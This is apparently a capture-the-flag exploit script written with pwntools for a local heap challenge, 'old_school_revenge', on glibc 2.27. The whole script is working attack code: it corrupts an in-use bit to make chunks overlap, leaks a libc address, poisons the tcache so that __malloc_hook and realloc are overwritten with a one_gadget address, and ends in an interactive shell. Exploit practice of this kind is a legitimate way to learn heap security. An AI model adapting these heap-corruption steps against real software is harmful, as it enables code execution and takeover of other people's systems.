from pwn import *
libc = ELF('/home/wsxk/Desktop/ctf/libc-2.27.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget = [0x4f3d5,0x4f432,0x10a41c]
ld_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/ld-2.27.so"
#libc_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/libc-2.27.so"
libc_path = "/home/wsxk/Desktop/ctf/libc-2.27.so"
p = process([ld_path, "./old_school_revenge"], env={"LD_PRELOAD":libc_path})
#p=process("./old_school")

def alloc(index,size):
        p.recvuntil('Your choice: ')
        p.sendline('1')
        p.recvuntil('Index')
        p.sendline(str(index))
        p.recvuntil('Size: ')
        p.sendline(str(size))
def edit(index,content):
        p.recvuntil('Your choice: ')
        p.sendline('2')
        p.recvuntil('Index: ')
        p.sendline(str(index))
        p.recvuntil('Content: ')
        p.sendline(content)
def show(index):
        p.recvuntil('Your choice: ')
        p.sendline('3')
        p.recvuntil('Index: ')
        p.sendline(str(index))
        p.recvuntil('Content: ')
def free(index):
        p.recvuntil('Your choice: ')
        p.sendline('4')
        p.recvuntil('Index: ')
        p.sendline(str(index))

alloc(1,0x18)
alloc(2,0x100)
alloc(3,0x80)
alloc(4,0x10)
#gdb.attach(p)
edit(2,p8(0) * 0xf0 + p64(0x100))
for i in range(9,16):#tcache 0x110 full
        alloc(i,0x100)
for i in range(9,16):
        free(i)
#gdb.attach(p)
free(2)
#gdb.attach(p)
edit(1,p8(0) * 0x18) #change in_use bit
#gdb.attach(p)
alloc(2,0x80)
#gdb.attach(p)
alloc(5,0x40)
for i in range(9,16):#tcache 0x90 full
        alloc(i,0x80)
for i in range(9,16):
        free(i)
free(2)
free(3)
for i in range(9,16):#tcache 0x90 clear
        alloc(i,0x80)
alloc(2,0x80)
for i in range(9,16):#tcache 0x90 full
        free(i)
show(5)
leak_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak_addr - 0x7f2d11a70ca0 + 0x7f2d11685000
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc_hook = libc_base + libc.sym['realloc']
for i in range(9,16):#tcache 0x110 clear
        alloc(i,0x100)
alloc(7,0x100)
free(7)
edit(5,p64(malloc_hook - 0x10))
alloc(7,0x100)
alloc(8,0x100)
edit(8, p64(0) + p64(one_gadget[2] + libc_base) + p64(realloc_hook + 2))
free(4)
#gdb.attach(p)
#pause()
gdb.attach(p)
alloc(4,0x10)
p.interactive()